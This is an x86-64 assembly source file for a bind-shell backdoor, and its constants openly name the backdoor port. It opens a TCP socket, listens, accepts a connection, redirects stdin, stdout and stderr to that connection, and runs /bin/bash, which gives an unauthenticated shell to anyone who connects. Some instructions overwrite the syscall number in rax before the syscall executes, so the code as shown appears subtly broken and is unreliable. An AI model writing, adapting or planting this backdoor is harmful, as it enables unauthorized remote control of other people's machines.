.include "defs.h"

NULL = 0
SIZEOF_UINT_16_T = 2
SIZEOF_STRUCT_SOCKADDR = 16

ACCEPTED_CONNECTIONS = 1
BACKDOOR_PORT_HTONS = 0xE307


sock_address:
	.zero	16
	.comm	sock,4,4
	.comm	sock_fd,4,4
	.globl	bash
	.section	.data

.bash_str_data:
	.string	"/bin/bash"
	.data
	.align 8
	.type	bash, @object
	.size	bash, 8

bash_ptr:
	.quad	.bash_str_data
	.text
	.globl	main
	.type	main, @function

.section .text

.global _start
_start:
	# dynamic stack alloc. maybe remove
#	pushq	%rbp
#	movq	%rsp, %rbp

	movq    $SYS_SOCKET, %rax
	movl	$AF_INET, %edi
	movl	$SOCK_STREAM, %esi
	movl	$IPPROTO_TCP, %edx
	syscall

	movq	$SYS_BIND, %rax
	movl	%eax, sock(%rip)
	movw	$AF_INET, sock_address(%rip)
	movw	$BACKDOOR_PORT_HTONS, sock_address+SIZEOF_UINT_16_T(%rip)
	movl	sock(%rip), %eax
	movl	$SIZEOF_STRUCT_SOCKADDR, %edx
	movl	$sock_address, %esi
	movl	%eax, %edi
	syscall

	movq    $SYS_LISTEN, %rax
	movl	sock(%rip), %eax
	movl	%eax, %edi
	movl	$ACCEPTED_CONNECTIONS, %esi
	syscall

	movq	$SYS_ACCEPT, %rax
	movl	sock(%rip), %eax
	movl	$NULL, %edx
	movl	$NULL, %esi
	movl	%eax, %edi
	syscall

	movq	$SYS_DUP2, %rax
	movl	%eax, sock_fd(%rip)
	movl	sock_fd(%rip), %eax
	movl	$STDIN, %esi
	movl	%eax, %edi
	syscall

	movq	$SYS_DUP2, %rax
	movl	sock_fd(%rip), %eax
	movl	$STDOUT, %esi
	movl	%eax, %edi
	syscall

	movq	$SYS_DUP2, %rax
	movl	sock_fd(%rip), %eax
	movl	$STDERR, %esi
	movl	%eax, %edi
	syscall

	movq	$SYS_EXECVE, %rax
	movq	bash_ptr(%rip), %rax
	movl	$NULL, %edx
	movl	$NULL, %esi
	movq	%rax, %rdi
	syscall

	movq $SYS_EXIT, %rax
	movq $0, %rdi
	syscall
